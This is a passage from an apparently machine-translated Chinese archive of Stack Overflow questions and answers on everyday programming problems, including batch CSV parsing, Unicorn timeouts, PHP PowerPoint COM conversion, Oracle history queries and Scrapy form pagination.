      endlocal
      echo %%~a, %%~b, %%~c
      setlocal EnableDelayedExpansion
      pause
    )

    endlocal

) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:29:18.830

这有点棘手，因为多个 delim 将被压缩为一个 delim。

因此，您需要将它们替换为*唯一的*delim 序列。

```
@Echo Off
setlocal DisableDelayedExpansion
For /F "usebackq tokens=1-3  delims=" %%a in (test.csv) Do (
    set "line=%%a"
    setlocal EnableDelayedExpansion
    set "line="!line:,=","!""
    For /F "tokens=1-3  delims=," %%a in ("!line!") Do (
        echo %%~a, %%~b, %%~c 
    )
) 
```

这将每一列括在引号中，并且`%%~a`引号将在稍后被删除

**编辑：嵌入式逗号的解决方案**

[在这种情况下，它与如何拆分 ';'](https://stackoverflow.com/a/5472168/463115)的解决方案略有不同 [在 CMD 外壳中](https://stackoverflow.com/a/5472168/463115)

```
@echo off
setlocal DisableDelayedExpansion

For /F "usebackq tokens=1-3 delims=" %%x in (test.csv) Do (
    set "var=%%x"
    setlocal EnableDelayedExpansion
    set "var=!var:^=^^!"
    set "var=!var:&=^&!"
    set "var=!var:|=^|!"
    set "var=!var:<=^<!"
    set "var=!var:>=^>!"
    set "var=!var:,=^,^,!"
    rem ** This is the key line, the missing quote is intention
    call set var=%%var:""="%%
    set "var=!var:"="Q!"
    set "var=!var:^,^,="C!"
    set "var=!var:,,=,!"
    set "var=!var:""="!"

    set "var="!var:,=","!""
    for /F "tokens=1-3 delims=," %%a in ("!var!") do (      
        endlocal
        set "col1=%%~a"
        set "col2=%%~b"
        set "col3=%%~c"
        setlocal EnableDelayedExpansion
        if defined col1 (
            set "col1=!col1:"C=,!"
            set "col1=!col1:"Q="!"
        )

        if defined col2 (
            set "col2=!col2:"C=,!"
            set "col2=!col2:"Q="!"
        )

        if defined col3 (
            set "col3=!col3:"C=,!"
            set "col3=!col3:"Q="!"
        )
        echo a=!col1!, b=!col2!, c=!col3!
        endlocal
    )
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-08T17:00:42.837

使用像 SSED 这样的字符串编辑器，我通过创建一个临时文件克服了这个问题，在该文件中我用“，-”替换了“，”两次，然后将“-”视为原始文件中的一个空字段。 ..

```
 ssed "s/,,/,-,/ig;s/,,/,-,/ig" file1.csv > file1.tmp 
```

然后正确分配令牌。如果您需要编辑临时文件，然后返回 CSV，请使用...

```
 ssed "s/,-,/,,/ig;s/,-,/,,/ig" file1.tmp > file1.csv 
```

这似乎比在飞行中通过令牌替换字符串和具有子例程/等要简单得多。

# ruby-on-rails - 设置独角兽超时

> ID：10685600
> 
> 赞同：13
> 
> 时间：2012-05-21T12:50:43.433
> 
> 标签：ruby-on-rails, ruby, unicorn

我将`rails 3.0.11`,`ruby 1.9.3-p0`和用于我`nginx 1.0.4`的`unicorn 3.6.2`项目。我有一个问题。我必须在我的服务器上进行长期操作。大约是 150 秒。在这种情况下没关系。

我已经设置了我的 nginx 配置`location`

```
proxy_read_timeout 240;
proxy_send_timeout 240; 
```

并使用命令设置我的`unicorn.rb`文件

```
timeout 240 
```

但我总是`502 bad gateway`出错。我认为，独角兽的问题。我得到这个独角兽日志

```
E, [2012-05-21T11:52:21.052382 #30423] ERROR -- : worker=1 PID:30871 timeout (104.052329915s > 60s), killing
E, [2012-05-21T11:52:21.080378 #30423] ERROR -- : reaped #<Process::Status: pid 30871 SIGKILL (signal 9)> worker=1
I, [2012-05-21T11:52:21.105045 #30423]  INFO -- : worker=1 spawning...
I, [2012-05-21T11:52:21.111148 #894]  INFO -- : worker=1 spawned pid=894   
I, [2012-05-21T11:52:21.111659 #894]  INFO -- : Refreshing Gem list 
```

你能帮助我吗？任何帮助表示赞赏。谢谢你。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-10-08T03:00:42.503

复制评论中的答案，以便从“未回答”过滤器中删除此问题：

> 我从来没有使用过这个 gem，但是如果你**在 'deploy:restart', 'unicorn:reload' 之后**这样做，你需要重新启动 unicorn，而不仅仅是重新加载它。**sudo /etc/init.d/unicorn restart**并设置超时。在独角兽中，重新加载和重启是两个不同的东西。

〜回答毛里西奥·林哈雷斯（ [Maurício Linhares）](https://stackoverflow.com/users/293686/mauricio-linhares)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-04T13:01:31.740

在 config/unicron/production.rb 中更改超时后

我不得不跑

```
cap deploy 
```

然后停止并启动 unicron 主进程以获取新配置：

```
cap unicorn:stop
cap unicorn:start 
```

# php - 致命错误：带有消息的未捕获异常“com_exception”。在将ppt转换为jpg时

> ID：10685602
> 
> 赞同：9
> 
> 时间：2012-05-21T12:50:44.497
> 
> 标签：php, powerpoint, jpeg

当我运行打击代码时：

```
/*** PPT to Image conversion ***/
$ppt_file = 'E:\wamp\www\temp/a.pptx';
$app = new COM("PowerPoint.application") or die("Unable to instantiate PowerPoint");
$app->Visible = true;
$app->Presentations->Open($ppt_file); 
$app->Presentations[1]->SaveAs("E:/tmp/outdir",18);
$app->Presentations[1]->Close();
$app->Quit();
$app = null; 
```

它给了我一个例外：

> **致命错误：未捕获的异常 'com_exception' 带有消息“**来源：** Microsoft Office PowerPoint 2007
> **描述：** PowerPoint 无法打开文件。” 在 E:\wamp\www\temp\video_conversion.php:107 堆栈跟踪：#0 E:\wamp\www\temp\video_conversion.php(107): variant->Open('E:\wamp\www\tem ...') #1 {main} 在第 107 行的 E:\wamp\www\temp\video_conversion.php 中抛出**

我无法弄清楚是什么问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-21T22:19:48.347

这种问题是由于以下因素造成的。

1.  PHP.ini 设置
2.  文件夹权限
3.  服务器未启用允许打开
4.  允许上传大小

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-21T14:37:35.653

在您的错误中，您会看到以下消息：`PowerPoint could not open the file.' in E:\wamp\www\temp\video_conversion.php:107`

PHP 用户是否有权访问该文件`E:\wamp\www\temp/a.pptx`？

尝试更正你的斜线：`E:\wamp\www\temp\a.pptx`通常`/`指的是选项或参数。

归根结底，似乎是权限错误、位置问题或类似问题阻止了对该文件的访问。你能用`fopen`or打开文件`file_get_contents`吗？

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-27T03:21:22.800

用 com 类试试这个：

COM 类参考： - [http://us2.php.net/manual/en/class.com.php](http://us2.php.net/manual/en/class.com.php)

```
<html>
<head>
<title>ShotDev.Com Tutorial</title>
</head>
<body>
<?
    $ppApp = new COM("PowerPoint.Application");
    $ppApp->Visible = True;

    $strPath = realpath(basename(getenv($_SERVER["SCRIPT_NAME"]))); // C:/AppServ/www/myphp

    $ppName = "MySlides.ppt";
    $FileName = "MyPP";

    //*** Open Document ***//
    $ppApp->Presentations->Open(realpath($ppName));

    //*** Save Document ***//
    $ppApp->ActivePresentation->SaveAs($strPath."/".$FileName,17);  //'*** 18=PNG, 19=BMP **'
    //$ppApp->ActivePresentation->SaveAs(realpath($FileName),17);

    $ppApp->Quit;
    $ppApp = null;
?>
PowerPoint Created to Folder <b><?=$FileName?></b>
</body>
</html> 
```

* * *

或者试试这个：

```
$powerpnt = new COM("powerpoint.application") or die("Unable to instantiate Powerpoint");

$presentation = $powerpnt->Presentations->Open(realpath($file), false, false, false) or die("Unable to open presentation");

foreach($presentation->Slides as $slide)

{

    $slideName = "Slide_" . $slide->SlideNumber;

    $exportFolder = realpath($uploadsFolder);

    $slide->Export($exportFolder."\\".$slideName.".jpg", "jpg", "600", "400");

}

$powerpnt->quit(); 
```

# mysql - MySql5.0本地化

> ID：10685606
> 
> 赞同：0
> 
> 时间：2012-05-21T12:51:01.383
> 
> 标签：mysql, localization

我使用以下命令创建了一个数据库：

```
CREATE DATABASE localization CHARACTER SET utf8 COLLATE utf8_unicode_ci; 
```

我还使用以下命令在里面创建了一个表：

```
CREATE TABLE localization(id varchar(20),arabic varchar(20)); 
```

由于表本地化是数据库本地化的一部分，它也应该接受阿拉伯字符。如何验证表本地化是否接受本地化字符串。当我将阿拉伯语内容粘贴到编辑器上时，它变成了“？？？？？？”。有没有办法测试表格是否接受阿拉伯字符串？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-22T08:20:42.497

您使用了错误的数据类型。对于 Unicode（这是您需要的），您应该使用`nvarchar`而不是`varchar`

# c# - 默认用户安装后自动启动应用程序（不是系统用户）

> ID：10685615
> 
> 赞同：0
> 
> 时间：2012-05-21T12:51:28.170
> 
> 标签：c#, windows-installer, runas

我创建了一个简单的 Windows 应用程序，以及它的安装程序（`Setup project`）。

因为我想在安装后自动启动应用程序，所以我在 Installer.cs 中添加了这个脚本

```
public override void Commit(System.Collections.IDictionary savedState)
{
    string appPath = Context.Parameters["AssemblyPath"].ToString();
    System.Threading.Thread.Sleep(500);
    System.Diagnostics.Process.Start(appPath, "2");
} 
```

应用程序启动完美，但它以`SYSTEM user`.

![在此处输入图像描述](../Images/26fe603d053e3fdcf00bc2c494aff130.png)

**我希望自动启动的应用程序在`Default user`打开 MSI 的地方运行。**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-22T10:10:23.240

之前有一个[问题](https://stackoverflow.com/questions/247446/how-do-i-launch-an-application-after-install-in-a-visual-studio-setup-project)询问*如何*在安装后启动应用程序。不幸的是，标记为已接受答案的答案链接到与您已经拥有的基本相同的代码项目文章 - 正如您所注意到的，它具有可能在错误帐户下运行应用程序的缺点。

Peter Kelly 的[回答](https://stackoverflow.com/a/2736465/15498)链接到[Aaron Stebner 博客上的一篇文章](http://blogs.msdn.com/b/astebner/archive/2006/08/12/696833.aspx)，其中详细介绍了一种更正确的方法 - 您需要在 Install Execute 序列中添加一个操作，以便在安装完成*后*启动可执行文件。他包含一个脚本来对已构建的 msi 文件执行必要的更改。

使用其他安装程序技术（[Wix](http://wix.sourceforge.net/manual-wix3/run_program_after_install.htm)、Installshield 等），可能有一些方法可以直接在安装程序项目中进行配置。没有办法使用 Visual Studio 安装项目（除了使用 Aaron 的后期构建步骤）。另一个更喜欢避免 VS Setup 项目。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-22T07:39:49.600

*   从评论中，我很确定您有一个引导程序，它在开始时提升，然后您的安装运行提升。最后，当您启动应用程序时，它会继承执行上下文。
*   另一种可能性是您以延迟的自定义操作而不是立即的自定义操作来启动您的应用程序。立即自定义操作始终在当前用户的上下文中运行，而延迟操作通常在系统上下文中运行，因为它们应该对系统进行更改，而不是立即自定义操作。

没有更多细节，很难说为什么您的应用程序在系统上下文中启动。

简而言之，您必须在安装开始时保存当前用户的上下文，在系统上下文中运行安装本身，然后在安装完成后，在原始用户的上下文中启动您的应用程序。

有关此方法的更多详细信息，请参阅[从 UAC 管理员级别进程以降低的权限启动进程](https://stackoverflow.com/questions/7870319/c-sharp-starting-process-with-lowered-privileges-from-uac-admin-level-process/7880040#7880040)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T11:32:07.307

我从这篇文章中得到了解决方案

[启动 Windows 服务并启动 cmd](https://stackoverflow.com/questions/4147821/start-a-windows-service-and-launch-cmd)

这解决了我的`SYSTEM`用户问题

# linux - linux上的teamcity xbuild

> ID：10685620
> 
> 赞同：3
> 
> 时间：2012-05-21T12:51:41.070
> 
> 标签：linux, mono, teamcity, xbuild

当我运行我的构建时，它将失败并显示以下日志：

```
[14:14:45]Checking for changes
[14:15:02]Publishing internal artifacts
[14:15:02]Clearing temporary directory: /var/TeamCity/buildAgent/temp/buildTmp
[14:15:02]Free disk space requirement
[14:15:02][Free disk space requirement] Free disk space requirement of 3.0Gb is not met for directory /var/TeamCity/buildAgent/work/870524f98b27404c (only 2474.7Mb is free).
[14:15:02][Free disk space requirement] Free disk space requirement of 3.0Gb could not be met for directory /var/TeamCity/buildAgent/work/870524f98b27404c (only 2474.7Mb is free)
[14:15:02]Checkout directory: /var/TeamCity/buildAgent/work/870524f98b27404c
[14:15:02]Repository sources transferred
[14:15:02]Updating sources: server side checkout
[14:15:02]Starting: /usr/bin/mono /var/TeamCity/buildAgent/plugins/dotnetPlugin/bin/JetBrains.BuildServer.MsBuildBootstrap.exe /workdir:/var/TeamCity/buildAgent/work/870524f98b27404c /msbuildPath:/usr/lib/mono/4.0/xbuild.exe
[14:15:02]in directory: /var/TeamCity/buildAgent/work/870524f98b27404c
[14:15:03]Process exited with code 1
[14:15:03]MSBuild output
[14:15:03][MSBuild output] Start MSBuild...
[14:15:03][MSBuild output] '/usr/bin/mono' '/usr/lib/mono/4.0/xbuild.exe "@/var/TeamCity/buildAgent/work/870524f98b27404c/MyNancy.sln.teamcity.msbuild.tcargs" MyNancy.sln'
[14:15:03][MSBuild output] working dir = '/var/TeamCity/buildAgent/work/870524f98b27404c'
[14:15:03][MSBuild output] MSBUILD: error MSBUILD0004: Too many project files specified
[14:15:04]Publishing internal artifacts
[14:15:04][Publishing internal artifacts] Sending build.finish.properties.gz file
[14:15:04]Build finished 
```

有没有办法捕获 tcargs 文件内容？它不在构建代理的临时目录中。也许有人知道我做错了什么。当我手动调用工作目录上的 xbuild 时，它构建得很好。谢谢

# android - 从 android 上的 IP 摄像头接收视频流

> ID：10685625
> 
> 赞同：10
> 
> 时间：2012-05-21T12:52:19.627
> 
> 标签：android, ffmpeg, android-mediaplayer, gstreamer, ip-camera

我有一个 IP 摄像机，它以 MJPEG 格式传输视频。现在我的目标是接收它并将其显示在我自己的自定义 android 应用程序中。为此，我在 android 平台上有三种编程选择：

1.  使用内置的 Android MediaPlayer 类
2.  在本机 C 中使用 FFMPEG 库并通过 JNI 访问它
3.  在android上使用GStreamer端口接收流

所以请提出一个更好的解决方案？

我没有使用 FFMPEG 或 GS​​treamer 的经验。那么这样做的可行性如何呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-08-24T17:30:34.437

使用[gstreamer](http://docs.gstreamer.com/display/GstSDK/Android+tutorials)。

我在 beagleboard 上使用了 gstreamer，它具有 1GHz 处理器，用于以 30 fps 的速度从 2 个摄像头拍摄图像，并且 CPU 处理能力非常低。

Gstreamer 能够合并图像、添加字符串、更改格式。并在流中轻松呈现您想要的内容。您唯一需要做的就是相互添加[黑匣子](http://docs.gstreamer.com/display/GstSDK/Basic+tutorial+3%3A+Dynamic+pipelines)。

您可以动态和静态地添加黑盒。

如果您不打算更改流取决于程序中的输入，我建议使用[static one](http://wiki.oz9aec.net/index.php/Gstreamer_cheat_sheet)。但我不确定它是否适用于android..

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-07-29T14:30:30.790

要测试第三个选项（gstreamer），您可以使用此应用程序：[https](https://play.google.com/store/apps/details?id=pl.effisoft.rpicamviewer2) ://play.google.com/store/apps/details?id=pl.effisoft.rpicamviewer2 。您还可以使用以下代码从您的代码中打开 gstreamer 预览：

```
Intent intent = new Intent("pl.effisoft.rpicamviewer2.PREVIEW");
int camera =0;

//--------- Basic settings
intent.putExtra("full_screen", true);

intent.putExtra("name"+camera, "My pipeline name");
intent.putExtra("host"+camera, "192.168.0.1");
intent.putExtra("port"+camera, 5000);
intent.putExtra("description"+camera, "My pipeline description");
intent.putExtra("uuid"+camera, UUID.randomUUID().toString() );
intent.putExtra("aspectRatio"+camera, 1.6);
intent.putExtra("autoplay"+camera, true);

//--------- Enable advanced mode
intent.putExtra("advanced"+camera, true);   //when advanced=true, then     custom_pipeline will be played
                                        //when advanced=false, then pipeline will be generated from host, port (use only for backward compatibility with previous versions)
intent.putExtra("custom_pipeline"+camera, "videotestsrc ! warptv ! autovideosink");

//--------- Enable application extra features
intent.putExtra("extraFeaturesEnabled"+camera, false);

//--------- Add autoaudiosink to featured pipeline
intent.putExtra("extraFeaturesSoundEnabled"+camera, false);

//--------- Scale Video Stream option
intent.putExtra("extraResizeVideoEnabled"+camera, false);
intent.putExtra("width"+camera, 320);       //used only when extraResizeVideoEnabled=true
intent.putExtra("height"+camera, 200);      //used only when extraResizeVideoEnabled=true

//--------- Add plugins
ArrayList<String> plugins = new ArrayList<String>();
intent.putExtra("plugins"+camera, plugins);

intent.setPackage("pl.effisoft.rpicamviewer2");
startActivityForResult(intent, 0); 
```

# zend-framework - Zend 模块之间的通信

> ID：10685628
> 
> 赞同：0
> 
> 时间：2012-05-21T12:52:42.123
> 
> 标签：zend-framework

有没有一种方法可以在 Zend 模块之间进行通信，如下所述？

我希望 $sVariable 返回“bla”。但它给了我

```
Zend_Controller_Action_Helper_ActionStack Object. 
```

在一个模块调用中：

```
$sVariable = $this->_helper->actionStack('login', 'index', 'user');
echo $sVariable; 
```

在另一个模块中：

```
class User_IndexController extends Zend_Controller_Action
{
    public function loginAction()
    {
        return "bla";
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T14:59:57.927

你正在做的不是一个好习惯，但如果你仍然想让它工作，做回声而不是返回

```
class User_IndexController extends Zend_Controller_Action{
    public function loginAction(){
        echo "bla";
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-23T14:57:03.263

一个选项是使用 Zend_Regsitry。在 loginAction() 你可以这样做：

```
Zend_Registry::set('bla', $aUserData['sVariable']); 
```

为了取回它，你可以做到。

```
$registry = Zend_Registry::getInstance();
echo ($registry['sVariable']); 
```

但它很乱。因此，我将控制器操作中的内容移至助手。这解决了我的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T19:57:45.550

跨模块控制器进行通信通常不是最佳实践。这个变量/逻辑可以移动到模型中吗？自动加载器使跨模块处理模型变得非常简单。

# php - Magento 1.7 和 Wamp 2.2

> ID：10685631
> 
> 赞同：0
> 
> 时间：2012-05-21T12:52:55.523
> 
> 标签：php, magento, installation, wamp

刚刚下载了最新的 wamp 2.2 和 magento 1.7

我将magento文件夹放入www文件夹

我去`localhost/magento`说“到本地主机的连接被中断了。”</p>

也试过`localhost/magento/install`

并尝试`http://127.0.0.1/magento`得到错误“谷歌浏览器与本地主机的连接尝试被拒绝。”

关于为什么什么都没有出现的任何想法？因为我的其他本地主机文件工作正常。我在 magento 论坛上发布了这个，其他 5 个人说他们有同样的问题，但没有答案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T18:03:24.063

当我们在开发环境中升级到 Magento 1.7 时，我们遇到了同样的问题。Apache 在加载任何页面时都崩溃了，所以我们得到了同样的错误。

我们找到的唯一解决方案是切换回[Wamp 2.1](http://sourceforge.net/projects/wampserver/files/WampServer%202/WampServer%202.1/)。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-27T18:34:25.410

确保您更新了 curl 扩展。可在[http://www.anindya.com/php-5-4-3-and-php-5-3-13-x64-64-bit-for-windows/下载](http://www.anindya.com/php-5-4-3-and-php-5-3-13-x64-64-bit-for-windows/)

您只需要下载底部的固定扩展。

此外，请检查您的 C:\Windows\System32\Drivers\etc\hosts 并确保将请求保留在本地。

# sql - 给定oracle中的生效日期，如何编写查询以获取最新的员工记录？

> ID：10685632
> 
> 赞同：1
> 
> 时间：2012-05-21T12:52:55.737
> 
> 标签：sql, oracle

我有一个employee 和employee_history 表。对于employee 表的每次更新，我都会在employee_history 表中插入一条记录。

这两个表都有一个名为“生效日期”的列，表示员工在该生效日期的状态。

下面是我的两张表。

![在此处输入图像描述](../Images/d0ae59b353d1ec6c3ae584373d960fa3.png)

我需要在该生效日期获得最新的员工记录。

例如，如果我需要在 16 日获得员工，我应该从历史表中获得 emp_hist_id = 2 记录。在 6 月 5 日，我应该从 hist 表中获取 emp_hist_id = 4 。

并且在 8 月 15 日，我应该从员工表本身获取记录。

请帮忙。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T13:04:05.810

你可以尝试类似的东西

```
SELECT * FROM (
  SELECT * FROM (
    (SELECT emp_id, name, email, title, region, division, "effective date" 
     FROM employee
     WHERE emp_id = desired_id)
    UNION
    (SELECT emp_id, name, email, title, region, division, "effective date" 
     FROM employee _history
     WHERE emp_id = desired_id)
  ) t
  WHERE t."effective date" <= desired_date
  ORDER by t."effective date" DESC) p
WHERE ROWNUM = 1 
```

这个想法是从两个表中获取与所需用户相关的记录，然后获取低于所需用户的日期，最后捕获第一个

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T13:09:22.110

您可以在没有分析函数的情况下解决此问题。这里的子查询计算员工生效日期之前历史记录中最近的生效日期：

```
select e.*
from employee_history eh join
     (select e.employee_id, max(eh.effective_date) as latest_effective_date
      from employee e join
           employee_history eh
           on e.employee_id = eh.employee_id and
              e.effective_date >= eh.effective_date
     ) ehl
     on eh.employee_id = ehl.employee_id and
        eh.effective_date = ehl.effective_date 
```

此解决方案假定历史记录表中没有重复的生效日期。如果有，那么您还有另一个选择。假设按顺序分配employee_history_ids，取该id 的最大值而不是日期。

使用 Oracle 的分析函数可以使用其他解决方案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:49:57.120

尝试以下操作：

```
SELECT *
FROM
  (SELECT e.emp_id,
          e.name,
          e.email,
          e.title,
          e.region,
          e.division,
          e.effective_date,
          row_number() over (partition BY e.emp_id
                             ORDER BY e.effective_date DESC) rn
   FROM employee e
   UNION ALL 
   SELECT eh.emp_id,
          eh.name,
          eh.email,
          eh.title,
          eh.region,
          eh.division,
          eh.effective_date,
          row_number() over (partition BY eh.emp_id
                             ORDER BY eh.effective_date DESC) rn
   FROM employee_history eh)
WHERE effective_date < to_date('15/06/2012','DD/MM/YYYY')
  AND rn = 1 
```

[你可以在这里](http://sqlfiddle.com/#!4/3a25f/2)看到一个更好的例子

# java - 如何在 java 中使用 SetWindowsHookEx 函数？

> ID：10685635
> 
> 赞同：1
> 
> 时间：2012-05-21T12:53:17.183
> 
> 标签：java, winapi, java-native-interface, hook, keylogger

我想将键记录在我用 java 设计的表中。要获取用户正在按下的键*（在 Windows 上），*我建议使用该功能[`SetWindowsHookEx`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms644990%28v=vs.85%29.aspx)。但我不知道如何使用这个功能。基本上我想`SetWindowsHookEx`用它收到的击键调用我的java函数。然后我会将这些键记录到表中供用户稍后查看。我不明白上述函数的论点。基本上我如何使用这个功能来实现任务。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:10:43.947

看看[jnativehook](http://code.google.com/p/jnativehook/)。它是一个使用 Java 的系统范围的键盘/鼠标钩子的库。

# javascript - CSS背景颜色不显示

> ID：10685637
> 
> 赞同：1
> 
> 时间：2012-05-21T12:53:24.250
> 
> 标签：javascript, css

我有几个盒子（超过 100 个）将动态创建

```
<div id="window5"></div>
<div id="window18"></div>
<div id="window190"></div> 
```

根据数据库条件，不同的框中会出现一些默认的不同颜色。现在，如果我单击一个框，颜色应该是灰色，然后如果我单击另一个框，颜色应该变为红色（第一个框颜色应该恢复正常）。我只能在以下情况下获得灰色（onclick）我的默认颜色不存在。如果存在某些颜色，则灰色将隐藏在原始默认颜色下。是否有任何 css 属性可以解决此问题。

我的css文件：

```
.selected{
    background-color: red;
} 
```

使用 javascript 代码作为；

```
 $(document).ready(function () {
        $("div[id *= 'window']").live('click', function (e) {

           $(".selected").removeClass("selected");
            $(this).addClass("selected");
            e.stopPropagation();
        });
        $(document).click(function () {
            $(".selected").removeClass("selected");
        });
    });       

</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:56:03.977

div 没有大小，所以没有背景显示。

如果您将显示文本放在您的 div 中，或者您给它一个宽度和高度，它将显示您的背景

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:59:10.623

如果您已经在样式表中指定了背景颜色，那么这可能会优先。要克服这个问题，您可以使用内联样式或 !important 指令。

```
background-color:red!important; 
```

# spring - 带有多个OUT的Ibatis Spring存储过程

> ID：10685640
> 
> 赞同：0
> 
> 时间：2012-05-21T12:53:48.510
> 
> 标签：spring, ibatis

是否可以使用 Ibatis 2.3.4 与 Spring 2.7 集成在 oracle 中实现存储过程调用，该调用具有 3 个以上的输出（OUT），

如果可能，请提供链接以供参考，

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-25T18:51:05.210

我在 Spring 上实现了使用 iBatis 调用的 oracle 存储过程，但找不到上述关于 3 OUT 参数的限制。在我看来，可以为您的目的创建存储过程，使用此链接作为参考：

[Ibatis 和 Oracle 程序](http://andrius.miasnikovas.lt/2008/09/ibatis-and-stored-oracle-proceduresfunctions/)

如果您有任何问题，请告诉我。

HTH。

# mysql - 从 MySQL 中的两个 pk (pivot) 表中删除的最佳方法

> ID：10685644
> 
> 赞同：0
> 
> 时间：2012-05-21T12:54:29.220
> 
> 标签：mysql, delete-row

我有这样的桌子设计：

```
id_a    int(10) NO  PRI     
id_b    int(10) NO  PRI 
```

例如：我想删除一列包含“1”，第二列包含“2”的数据对。但有两种可能：

```
1) id_a = 1, id_b = 2
2) id_a = 2, id_b = 1 
```

而且我更新知道“1”是否会在列 id_a 或 id_b 中。处理这样的删除的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T12:59:08.350

只需寻找两者：

```
WHERE (id_a = 1 AND id_b = 2) 
   OR (id_a = 2 AND id_b = 1) 
```

# forms - 添加子表单后在 MS Access 中恢复“连续”表单行为

> ID：10685645
> 
> 赞同：0
> 
> 时间：2012-05-21T12:54:33.340
> 
> 标签：forms, ms-access, ms-access-2007

我在 Access 2007 中创建了一个*组织*表单，当它在“表单视图”中时，单击显示在表单底部的导航按钮可用于显示*组织表中的任何记录。*接下来，我在 Organization 表单中创建了一个子表单，以显示另一个表中的记录，这些记录具有来自 Organization 表的外键。

现在，组织表单的“默认视图”属性已自动设置为“单一表单”，当我尝试将其设置为“连续表单”时，我收到以下消息：

> **如果表单包含子表单、ActiveX 控件或绑定图表，则不能将其视为连续表单。**
> 
> 将窗体的 DefaultView 属性设置为单个窗体、数据表、数据透视表或数据透视图。

此外，我无法使用该表单查看除组织表中的第一条记录之外的任何记录。如何使用记录 ID 在我的表单中显示组织表中的其他记录？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T18:49:26.083

在调查这个问题时，我发现 Microsoft 自己的[Northwind Traders 示例数据库](http://www.microsoft.com/en-us/download/details.aspx?id=19704)包含至少一个带有子表单的表单，这些子表单展示了我想要的行为，即使在“单一表单”视图中也是如此。这表明子表单不是问题的原因。

在尝试重现示例数据库中完成的效果时，我重新创建了我的表单并一个一个地重新添加了元素，测试了每一步的导航。我能够通过“表单视图”导航按钮查看不同的记录，直到我从一个不包含在子表单中的组织以外的表中添加控件。

所以你有它; 当主表单包含来自多个表的记录时，无法通过“表单视图”中的导航控件在表单的源记录之间切换。

# javascript - 在scrapy中提交多个表单并实现分页

> ID：10685650
> 
> 赞同：0
> 
> 时间：2012-05-21T12:55:02.137
> 
> 标签：javascript, python, scrapy

我是scrapy的新手，我正在抓取一个由职位组成的基于工作的网站，即，当我们点击职位时，将打开一个新页面，其中包含我需要获取的数据。

例如，该页面包含具有以下格式的表格，

```
 Job Title                  Full/Part Time                             Location/Affiliates
1\.   Accountant                   Full Time                           Mount Sinai Medical Center (Manhattan)  
2\.   Accountant                   Full Time                           Mount Sinai Medical Center (Manhattan) 
3\.   Admin Assistant              Full Time                           Mount Sinai Hospital (Queens) 
4\.   Administrative Assistant     Full Time                      Mount Sinai Medical Center (Manhattan)  

Page:  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 
```

上面提到的所有职位都是 javascript 生成的链接，我需要提交所有带有值的 javascript 链接（使用 firebug 找到）。如何一次提交多个表单，或者如何编写一种循环遍历所有职位链接的方法所以我们可以从职位的每个链接中获取数据。

我还需要对上面提到的所有页面进行分页，当我单击第 2 页时，会打开一个页面，该页面由具有不同工作职位的相同表格格式组成，等等，我如何在 scrapy 中对这些页面进行分页。

**我的代码是**：

```
class MountSinaiSpider(BaseSpider):
   name = "mountsinai"
   allowed_domains = ["mountsinaicss.igreentree.com"]
   start_urls = [
       "https://mountsinaicss.igreentree.com/css_external/CSSPage_SearchAndBrowseJobs.ASP?T=20120517011617&",
   ]

# This method is for submitting starting page with some values for clicking "Find Jobs"
   def parse(self, response):
       return [FormRequest.from_response(response,
                                        formdata={ "Type":"CSS","SRCH":"Search&nbsp;Jobs","InitURL":"CSSPage_SearchAndBrowseJobs.ASP","RetColsQS":"Requisition.Key¤Requisition.JobTitle¤Requisition.fk_Code_Full_Part¤[Requisition.fk_Code_Full_Part]OLD.Description(sysfk_Code_Full_PartDesc)¤Requisition.fk_Code_Location¤[Requisition.fk_Code_Location]OLD.Description(sysfk_Code_LocationDesc)¤Requisition.fk_Code_Dept¤[Requisition.fk_Code_Dept]OLD.Description(sysfk_Code_DeptDesc)¤Requisition.Req¤","RetColsGR":"Requisition.Key¤Requisition.JobTitle¤Requisition.fk_Code_Full_Part¤[Requisition.fk_Code_Full_Part]OLD.Description(sysfk_Code_Full_PartDesc)¤Requisition.fk_Code_Location¤[Requisition.fk_Code_Location]OLD.Description(sysfk_Code_LocationDesc)¤Requisition.fk_Code_Dept¤[Requisition.fk_Code_Dept]OLD.Description(sysfk_Code_DeptDesc)¤Requisition.Req¤","ResultSort":"" },
                                        callback=self.parse_main_list)]

   def parse_main_list(self, response):
       return [FormRequest.from_response(response,
